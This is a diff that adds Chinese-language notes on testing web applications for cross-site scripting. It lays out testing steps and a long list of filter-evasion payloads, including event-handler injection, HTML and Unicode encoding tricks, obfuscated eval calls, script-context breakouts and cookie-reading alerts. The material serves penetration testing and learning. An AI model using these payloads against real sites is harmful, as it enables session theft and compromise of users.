@@ -1,0 +1,99 @@
+﻿xss
+测试步骤：
+1、输入一个几乎不出现的字符串在应用程序中，以其作为每个页面的每一个参数，且每次只针对一个参数，
+监控程序响应，看是否出现同样字符串，然后替换字符串为脚本，在进行测试。
+2、进行避开过滤测试。
+3、post发现xss，要用burp的get同样继续测试.
+4、对http消息头进行测试。
+
+实例（如输入myxsstest），进行这些测试时必须对任何特殊字符如&,=+;和空格进行url编码：
+1、验证性测试攻击字符串："><script>alert(document.cookie)</script>，可以用于实现自动化
+2、终止包含字符串的双引号，结束之前的html标签，然后通过其他方法引入js脚本，如：
+"><script>alert(1)</script>
+3、为避开过滤，在该html标签中包含js事件处理器，如标签为<input type="text" name="addr" value="myxsstest">：
+" onfocus="alert(1)
+4、当受控字符串被插入到现有的脚本中，可以终止字符串周围的单引号，用一个分号终止整个语句，然后后直接处理想要执行的js，如：
+返回相应是：<script> var a = 'myxsstest' ; var b = 123,...</script>
+替换myxsstest为 :';alert(1); var foo='，需要保证脚本正常，另一种方法是使用//结束输入，将剩下的脚本当做注释处理。
+5、包含url特性，如返回<a href="myxsstest">click here</a>,这是受控字符串被插入到一个<a>标签的href中，在一些
+浏览器中，这个属性可能包含javascript:协议的url，从而使用以下脚本直接利用xss：
+javascript:alert(1)，也可以注入一个事件管理器：
+#" onclick="javascript:alert(1)
+
+绕过过滤：技巧
+<scri<script>pt>alert(1)</scri</script>pt>
+<!--均在chrome测试-->
+<!--style onreadystatechange=alert(0)-->
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><!--alert(1)-->
+<!--xml onreadystatechange=alert(2)-->
+<!--object data="data:text/html,<script>alert(3)</script>"-->
+<Img src="" onerror="alert(4)"/>
+<img src="" onerror="alert(5)"/>
+<img src="" onerror="javascript:alert(6)"/>
+<[%00] img onerror=alert(10) src=a><!--不执行-->
+<i[%00]mg onerror=alert(11) src=a><!--不执行-->
+<img/onerror=alert(12) src=a>
+<img [%09] onerror=alert(13) src=a>
+<img/" onerror=alert(14) src=a>
+<img/onerror=alert(140) src=a>
+<img/anyjunk/onerror=alert(15) src=a>
+<img o[%00]nerror=alert(16) src=a><!--不执行-->
+<script/anyjunk>alert(17)</script>
+<body onbeforeactivate=alert(18)>
+<!--iframe onreadystatechange=alert(19)-->
+<object onerror=alert(20)><!--不执行-->
+<!--input autofocus onfocus=alert(21)-->
+<a>here here</a onmousemove=alert(22)><!--不执行-->
+<video src=1 onerror=alert(23)>
+<embed src=javascript:alert(24)><!--不执行-->
+<x style=behavior:url(#default#time2) onbegin=alert(25)> <!--不执行-->
+<img onerror="alert(25)"src=a>
+<img onerror='alert(26)'src=a>
+<img onerror=`alert(27)`src=a><!--chorme不执行-->
+<img/onerror="alert(28)"src=a>
+<<img onerror=alert(29) src=a>>
+%253cimg%20onerror=alert(30)%20src=a%253e，首先被过滤器解码%3cimg onerror=alert(31) src=a%3e，
+后备浏览器解码为<img onerror=alert(30) src=a>
+<img onerror=a&#x0006c;ert(31) src=a>使用十进制或者十六进制代替html编码，并添加多个前导0并省略结尾的分号
+<img onerror=a&#0108ert(32) src=a>使用十进制或者十六进制代替html编码，并添加多个前导0并省略结尾的分号
+<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;33&#x29;>
+<img onerror=a&#x6c;ert(34) src=a>
+<<script>alert(35);//<</script>
+<script<{alert(36)}/></script><!--不执行-->
+<body onscroll=alert(37)><br><br><br>....<input autoocus>
+<input onblur=alert(38) autofocus><input autofocus>
+%u00ABimg onerror=alert(39) src=a%u00bb，unicode编码
+非标准编码避开过滤，UTF-7,US-ASCII,UTF-16，多字节字符集Shift-JIS,EUC-JP,BIG5(条件是控制Content-type或者对应的html元标签、charset)
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+避开过滤，脚本代码：
+<script>a\u006cert(40)</script>;unicode
+<script>eval('a\u006cert(41)')</script>;unicode
+<script>eval('a\x6cert(42)')</script>;16进制
+<script>eval('a\154ert(43)')</script>;10进制
+<script>eval('a\l\ert\(44\)')</script>;eval中多余转义被忽略
+<script>eval('al' +'ert\(45\)')</script>;动态构建
+<script>eval('al' +'ert(46)')</script>;动态构建带多余转义
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));动态构建</script>;alert(1)
+<script>eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));</script>;动态构建</script>;alert(1)
+<script>'alert(49)'.replace(/.+/,eval)</script>;无法直接使用eval的情况
+<script>function::['alert'](50)</script>;无法直接使用eval的情况
+<script>alert(document['cookie'])</script>;替代圆点
+<script>with(document)alert(cookie)</script>;替代圆点
+##以上方法的多种组合绕过
+绕过净化：
+1、前面方法依然适用，另外如果输入的脚本被插入到引用字符串中，应用程序经常在注入的引号字符前插入反斜线，
+这个时候要合适对反斜线本身是否被转义，如未被转义，则很容易受到攻击：如：
+var a = 'foo',那么可以注入 foo\';alert(1);//,脚本被解释为：var a='foo\\';alert(1);//';其中//是js注释，
+它把后面的单引号注释掉避免语法错误，结果如下，它会引发alert
+<script>
+var a='foo\\';alert(1);//'
+</script>
+2、var a = 'foo'，如果反斜线被正确转义，但是尖括号未被转义，那么攻击者可以使用如下字符串：
+</script><script>alert(1)</script>，这样做可以废弃原有的脚本，并在其后注入一段新的脚本，使攻击成功。
+因为浏览器在解析植入的js前会优先解析html标签
+<script>var a ='</script><script>alert(1)</script>，虽然原来的脚本包含一个错误，但无关紧要，它会跳过这个
+错误继续执行注入的脚本：<script>var a ='</script><script>alert(1)</script>
+3、对方单引号和双引号转义，可以用String.fromCharCode技巧，不用分隔符创建字符串。
+////////////////////////////////////////////////////////////////////////////////////////////
+url后面加#号，它后面的url会失效如：
+<img src="http://www.baidu.com#/image/i.gif"/> /image/i.gif会失效
